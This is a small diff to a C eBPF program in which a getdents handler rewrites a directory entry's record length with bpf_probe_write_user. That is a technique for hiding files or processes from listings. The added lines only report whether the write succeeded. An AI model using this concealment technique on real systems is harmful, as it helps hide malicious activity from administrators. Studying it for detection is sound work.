@@ -290,6 +290,14 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
     long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
 
+    /* send event */
+    struct event *e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0); /* reserve the sizeof our event */
+    if (e) {
+        e->success = (ret == 0);
+        bpf_ringbuf_submit(e, 0);
+    }
+
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
     return 0;
 }
